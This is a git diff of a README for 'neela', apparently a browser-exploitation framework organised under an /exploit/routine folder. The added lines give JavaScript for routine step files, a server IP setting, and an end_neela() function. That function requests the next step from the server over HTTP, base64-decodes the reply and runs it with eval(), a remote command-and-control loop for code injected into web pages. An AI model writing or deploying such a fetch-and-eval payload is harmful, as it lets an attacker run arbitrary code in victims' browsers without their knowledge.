@@ -44,7 +44,7 @@ node neela.js
 
 ##### Make Routine & Hack !
 * Create folder on /exploit/routine
-* Create info file
+Create info file
 
 ```javascript
 {
@@ -58,6 +58,46 @@ node neela.js
 }
 
 ```
+
+* Create step file exemple:
+  - step1.neela
+
+  ```javascript
+    alert('My first routine');
+  ```
+
+* set neela environement
+
+```javascript
+var serveur_neela = '10.34.2.139'; // Serv ip.
+var step_neela = 0; // step 0=1 1=2 ...
+var routine_name = 'Routine_folder_name';
+```
+
+* Update end function
+
+```javascript
+function end_neela(){
+
+	console.log('ok end');
+	var req = new XMLHttpRequest();
+	req.open('GET', 'http://'+serveur_neela+':3000/next/'+step_neela+'/'+routine_name, true);
+	req.onreadystatechange = function() {
+    if (req.readyState == XMLHttpRequest.DONE) {
+        eval(Base64.decode(req.responseText));
+    }
+}
+	req.send(null);
+}
+```
+
+* Get next step
+
+```javascript
+end_neela();
+```
+
+
 
 ```javascript
 if(document.getElementsByTagName('a') !== undefined){
